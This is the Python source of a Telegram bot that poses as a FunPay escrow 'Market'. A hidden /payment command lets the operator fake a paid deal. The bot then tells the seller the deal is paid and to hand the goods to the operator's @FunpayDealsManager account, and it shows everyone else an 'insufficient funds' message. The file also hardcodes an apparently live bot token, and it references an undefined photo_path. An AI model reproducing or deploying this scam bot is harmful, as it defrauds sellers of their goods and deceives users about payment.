import asyncio
import os
import random
import string
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ'
SUPPORT_URL = 'https://t.me/FunpayDealsManager'
CHANNEL_URL = 'https://t.me/NewsFunpayBot'


bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

DEALS = {}
PAYMENT_ACCESS = set()



class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_item = State()
    entering_requisites = State()

# --- КЛАВИАТУРЫ ---
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals"), 
         InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")],
        [InlineKeyboardButton(text="💳 Реквизиты", callback_data="reqs"),
         InlineKeyboardButton(text="🌐 Язык", callback_data="lang")],
        [InlineKeyboardButton(text="🔗 Рефералы", callback_data="refs"),
         InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")],
        [InlineKeyboardButton(text="📖 News", url=CHANNEL_URL),
         InlineKeyboardButton(text="📩 Обращения", callback_data="tickets")],
        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)]
    ])

def get_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Банковская карта RUB", callback_data="curr_rub")],
        [InlineKeyboardButton(text="💵 Банковская карта USD", callback_data="curr_usd")],
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_ton")],
        [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="curr_stars")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_pay_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ ---
async def send_step_photo(message: Message, text: str, reply_markup: InlineKeyboardMarkup):
    """Удаляет старое сообщение и присылает новое с картинкой"""
    try:
        await message.delete()
    except:
        pass

    if os.path.exists(photo_path):
        return await message.answer_photo(
            photo=FSInputFile(photo_path),
            caption=text,
            reply_markup=reply_markup
        )
    else:
        return await message.answer(text, reply_markup=reply_markup)

# --- ХЭНДЛЕРЫ ---

@router.message(Command("payment"))
async def secret_payment_command(message: Message):
    PAYMENT_ACCESS.add(message.from_user.id)
    await message.delete() 
    msg = await message.answer("🤫 Доступ к оплате успешно активирован.")
    await asyncio.sleep(3)
    await msg.delete()

@router.message(CommandStart())
async def start_cmd(message: Message, command: Command = None, state: FSMContext = None):
    if state:
        await state.clear()
        
    if command and command.args and command.args.startswith("deal_"):
        deal_id = command.args.split("_")[1]
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            text = (
                f"💳 <b>Сделка #{deal_id}</b>\n\n"
                f"👤 Продавец: @{deal['creator_username']}\n"
                f"📦 Товар: {deal['item']}\n\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"🏦 Реквизиты: <code>{deal['requisites']}</code>"
            )
            if os.path.exists(photo_path):
                await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_pay_keyboard(deal_id))
            else:
                await message.answer(text, reply_markup=get_pay_keyboard(deal_id))
            return

    text = "<b>Добро пожаловать в Market</b>\n\n🛡 Безопасные сделки\n💰 Автоматическое удержание\n🎯 Поддержка 24/7\n\nМенеджер: @FunpayDealsManager"
    
    if os.path.exists(photo_path):
        await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_main_keyboard())
    else:
        await message.answer(text, reply_markup=get_main_keyboard())

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await start_cmd(callback.message)

# --- СОЗДАНИЕ СДЕЛКИ (БЕЗ СЛЕТАЮЩИХ ФОТО) ---

@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealCreation.choosing_currency)
    await send_step_photo(callback.message, "💼 <b>Шаг 1:</b> Выберите валюту:", get_currency_keyboard())

@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    curr = callback.data.split("_")[1].upper()
    await state.update_data(currency=curr)
    await state.set_state(DealCreation.entering_amount)
    await send_step_photo(callback.message, f"✅ Валюта: {curr}\n💰 <b>Шаг 2:</b> Введите сумму сделки:", get_back_keyboard())

@router.message(DealCreation.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    await state.update_data(amount=message.text)
    await state.set_state(DealCreation.entering_item)
    # Удаляем сообщение пользователя для чистоты
    await message.delete()
    # Ищем последнее сообщение бота, чтобы его заменить (нужно хранить ID в идеале, но тут просто шлем новое)
    await send_step_photo(message, "📝 <b>Шаг 3:</b> Введите название товара:", get_back_keyboard())

@router.message(DealCreation.entering_item)
async def process_item(message: Message, state: FSMContext):
    await state.update_data(item=message.text)
    await state.set_state(DealCreation.entering_requisites)
    await message.delete()
    await send_step_photo(message, "💳 <b>Шаг 4:</b> Укажите реквизиты для выплаты:", get_back_keyboard())

@router.message(DealCreation.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    DEALS[deal_id] = {
        "creator_id": message.from_user.id,
        "creator_username": message.from_user.username or "User",
        "currency": data['currency'],
        "amount": data['amount'],
        "item": data['item'],
        "requisites": message.text
    }
    
    await state.clear()
    await message.delete()
    text = f"✅ <b>Сделка создана!</b>\n\n💰 Сумма: {data['amount']} {data['currency']}\n📦 Товар: {data['item']}\n\n🔗 <b>Ссылка для покупателя:</b>\n{link}"
    await send_step_photo(message, text, get_back_keyboard())

# --- ОПЛАТА ---

@router.callback_query(F.data.startswith("pay_"))
async def process_payment(callback: CallbackQuery):
    deal_id = callback.data.split("_")[1]
    if callback.from_user.id in PAYMENT_ACCESS:
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            await send_step_photo(callback.message, "✅ <b>Оплата принята!</b>\nСредства удержаны. Ожидайте товар.", None)
            
            await bot.send_message(
                deal['creator_id'], 
                f"🔔 Сделка #{deal_id} ОПЛАЧЕНА.\n\nПередайте товар: @FunpayDealsManager"
            )
    else:
        await callback.answer("❌ Недостаточно средств на балансе.", show_alert=True)

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
